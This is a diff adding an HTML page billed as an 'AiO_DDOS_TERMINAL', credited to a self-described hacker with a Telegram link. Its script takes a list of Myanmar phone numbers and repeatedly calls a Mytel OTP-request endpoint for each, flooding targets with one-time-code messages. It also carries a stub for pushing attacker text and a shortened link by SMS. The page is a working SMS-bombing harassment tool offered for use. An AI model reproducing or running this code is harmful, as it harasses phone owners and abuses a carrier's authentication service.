@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>[LOD] TERMINAL</title>
+    <style>
+        :root { --red: #ff0000; --blue: #0088ff; --dark: #050505; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: monospace; }
+        body { background: #000; color: #eee; padding: 10px; }
+
+        /* [C2_FRAME] */
+        .c2-box { border: 1px solid #1a1a1a; background: var(--dark); max-width: 1100px; margin: auto; }
+        .c2-head { background: #111; padding: 15px; border-bottom: 1px solid var(--red); display: flex; justify-content: space-between; align-items: center; }
+        
+        /* [TITLE BUTTON STYLE] */
+        .title-link {
+            text-decoration: none;
+            transition: 0.3s;
+        }
+        .title-btn-box {
+            border: 1px solid var(--red);
+            padding: 5px 15px;
+            display: inline-block;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .title-btn-box h2 { 
+            color: var(--red); 
+            letter-spacing: 3px; 
+            font-size: 1.2rem; 
+            margin: 0;
+        }
+        .title-btn-box:hover { 
+            background: var(--red); 
+            box-shadow: 0 0 15px var(--red);
+        }
+        .title-btn-box:hover h2 { color: #000; }
+
+        .c2-body { display: grid; grid-template-columns: 1fr 1.5fr; gap: 10px; padding: 15px; }
+        
+        /* [INPUTS] */
+        .inp-grp { margin-bottom: 15px; }
+        label { display: block; font-size: 0.7rem; color: #555; margin-bottom: 5px; text-transform: uppercase; }
+        textarea, input { 
+            width: 100%; background: #000; border: 1px solid #222; color: var(--blue); 
+            padding: 10px; font-size: 0.9rem; outline: none; border-left: 2px solid var(--red);
+        }
+
+        .btn-fire { 
+            width: 100%; padding: 15px; background: none; border: 1px solid var(--red); 
+            color: var(--red); font-weight: bold; cursor: pointer; transition: 0.3s;
+        }
+        .btn-fire:hover { background: var(--red); color: #000; box-shadow: 0 0 15px var(--red); }
+
+        /* [STATUS_LOG] */
+        #logArea { 
+            height: 400px; overflow-y: auto; background: #000; border: 1px solid #111; 
+            padding: 10px; font-size: 0.75rem; color: #444; 
+        }
+        .log-entry { margin-bottom: 5px; border-bottom: 1px solid #080808; padding: 2px 0; }
+        .log-ok { color: var(--blue); }
+        .log-err { color: var(--red); }
+
+        @media (max-width: 700px) { .c2-body { grid-template-columns: 1fr; } }
+    </style>
+</head>
+<body>
+
+<div class="c2-box">
+    <div class="c2-head">
+        <a href="https://t.me/+xx0ea7Lah4w0NDI9" target="_blank" class="title-link">
+            <div class="title-btn-box">
+                <h2>AiO_DDOS_TERMINAL</h2>
+            </div>
+        </a>
+        <span style="color:#333; font-size:0.7rem;">Crd TPZ // @empire_the_xacker</span>
+    </div>
+
+    <div class="c2-body">
+        <div class="control-side">
+            <div class="inp-grp">
+                <label>Targets [09...]</label>
+                <textarea id="targetList" rows="5" placeholder="09xxxxxxxxx&#10;09xxxxxxxxx"></textarea>
+            </div>
+
+            <div class="inp-grp">
+                <label>Injection Payload (စာသား + Link)</label>
+                <input type="text" id="payload" placeholder="Hacker_Text + bit.ly/link">
+            </div>
+
+            <div style="display:flex; gap:10px;">
+                <div class="inp-grp" style="flex:1;">
+                    <label>Limit</label>
+                    <input type="number" id="limit" value="100">
+                </div>
+                <div class="inp-grp" style="flex:1;">
+                    <label>Delay (ms)</label>
+                    <input type="number" id="delay" value="10000">
+                </div>
+            </div>
+
+            <button class="btn-fire" onclick="startStrike()">EXECUTE_STRIKE</button>
+        </div>
+
+        <div class="log-side">
+            <div id="logArea">
+                <div class="log-entry">> DS-DDOS LOOP ATTACK  Initialized...</div>
+                <div class="log-entry">> Ready for Strike...</div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    let running = false;
+
+    function log(msg, type='ok') {
+        const area = document.getElementById('logArea');
+        const entry = document.createElement('div');
+        entry.className = `log-entry ${type === 'ok' ? 'log-ok' : 'log-err'}`;
+        entry.innerHTML = `> [${new Date().toLocaleTimeString()}] ${msg}`;
+        area.prepend(entry);
+    }
+
+    async function startStrike() {
+        if(running) return;
+        const targets = document.getElementById('targetList').value.split('\n').filter(t => t.trim().length > 5);
+        if(targets.length === 0) return log("ERROR: NO_TARGETS", "err");
+
+        running = true;
+        const payload = document.getElementById('payload').value;
+        const limit = parseInt(document.getElementById('limit').value);
+        const delay = parseInt(document.getElementById('delay').value);
+
+        log(`STRIKE_INITIATED // PKT_COUNT: ${limit}`, "err");
+
+        for(let i=1; i<=limit; i++) {
+            if(!running) break;
+            let current = targets[(i-1) % targets.length].trim();
+            
+            // [STRIKE_VECTOR]
+            try {
+                // OTP Engine
+                fetch(`https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber=${current}`, {mode:'no-cors'});
+                
+                // Payload Injection (If exists)
+                if(payload) {
+                    // Custom SMS API Logic here
+                }
+
+                log(`DEPLOY_SUCCESS >> ${current} [V1/V2]`, "ok");
+            } catch(e) {
+                log(`DEPLOY_FAILED >> ${current}`, "err");
+            }
+
+            await new Promise(r => setTimeout(r, delay));
+        }
+        running = false;
+        log("STRIKE_COMPLETE // STANDBY", "ok");
+    }
+</script>
+
+</body>
+</html>
